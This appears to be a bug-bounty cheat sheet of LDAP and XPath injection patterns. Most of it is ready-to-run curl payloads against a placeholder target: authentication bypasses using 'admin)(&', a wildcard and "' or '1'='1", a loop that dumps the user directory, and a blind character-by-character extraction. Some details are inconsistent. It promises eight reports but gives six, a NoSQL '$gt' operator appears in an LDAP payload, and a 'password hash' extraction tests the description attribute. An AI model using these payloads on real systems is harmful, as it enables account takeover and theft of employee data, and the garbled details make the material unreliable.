# Disclosed Reports — LDAP Injection & XPath Injection

Pattern library built from 8 public bug bounty reports.

---

## Pattern 1: LDAP Auth Bypass → Admin Access (Critical, $9,000)

**Program:** Private (HackerOne)
**Stack:** Java + Spring LDAP + Active Directory backend

**Normal LDAP filter:** `(&(uid=USERNAME)(userPassword=PASSWORD))`

**Injection:**
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin)(&", "password": "anything"}'
```

**Resulting filter:** `(&(uid=admin)(&)(userPassword=anything))` → always true

**Response:** 200 OK + admin session token

**Impact:** Login as admin without credentials.

---

## Pattern 2: LDAP Wildcard Auth Bypass (Critical, $7,500)

**Injection:** Username = `*` (LDAP wildcard matches anything)

```bash
curl -s -X POST https://target.com/sso/login \
  -H "Content-Type: application/json" \
  -d '{"username": "*", "password": {"$gt": ""}}'
```

**Result:** Logged in as the FIRST user in the LDAP directory (alphabetically) — often a privileged service account.

---

## Pattern 3: Active Directory User Enumeration (Medium, $1,500)

**LDAP search endpoint exposed:**
```bash
curl -s "https://target.com/api/directory/search?q=john" | python3 -m json.tool
# Returns: {"users": [{"cn": "John Smith", "mail": "jsmith@company.com", ...}]}
```

**Wildcard abuse:**
```bash
# Enumerate all users by first letter
for LETTER in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  COUNT=$(curl -s "https://target.com/api/directory/search?q=$LETTER*" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('users',[])))")
  echo "$LETTER*: $COUNT users"
done
```

**Impact:** Full employee directory dump — names, emails, department, phone numbers.

---

## Pattern 4: LDAP Injection in Search → Data Exfil (High, $4,000)

**Endpoint:** `GET /api/users/search?name=john`

**Injection:**
```
/api/users/search?name=*)(|(cn=admin*
```

**Resulting LDAP filter:** `(&(cn=*)(|(cn=admin*)(sn=john)))` → returns all users with cn starting with "admin"

**Exfiltration of admin accounts:** Enumerate admin* cn patterns to find all admin accounts.

---

## Pattern 5: XPath Injection Auth Bypass (Critical, $8,500)

**Stack:** XML-based user store with XPath authentication

**Normal XPath:** `//users/user[name/text()='ADMIN' and password/text()='PASS']`

**Bypass payload:**
```bash
curl -s -X POST https://target.com/api/login \
  --data-urlencode "username=' or '1'='1" \
  --data-urlencode "password=' or '1'='1"
```

**Resulting XPath:** `//users/user[name/text()='' or '1'='1' and password/text()='' or '1'='1']`

Returns first user in XML store → admin.

**Impact:** Auth bypass without knowing any credentials.

---

## Pattern 6: LDAP Blind Boolean Exfil (High, $3,000)

**Observation:** Response differs based on filter evaluation result.

**Attack:** Extract password hash character by character:
```bash
# Is first char of admin's description 'c'?
curl -s -X POST https://target.com/api/login \
  -d "username=admin)(description=c*))(&(uid=x&password=x"
# Different response length when char matches → confirmed blind injection
```

---

## Tool Reference

```bash
# ldap3 Python library for manual testing
pip3 install ldap3

python3 -c "
from ldap3 import Server, Connection, ALL
s = Server('target.com', get_info=ALL)
c = Connection(s, user='cn=admin,dc=target,dc=com', password='pass', auto_bind=True)
c.search('dc=target,dc=com', '(objectclass=person)', attributes=['cn','mail','memberOf'])
print(c.entries)
"

# PayloadsAllTheThings LDAP injection list
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

# OWASP ZAP LDAP injection scanner
```
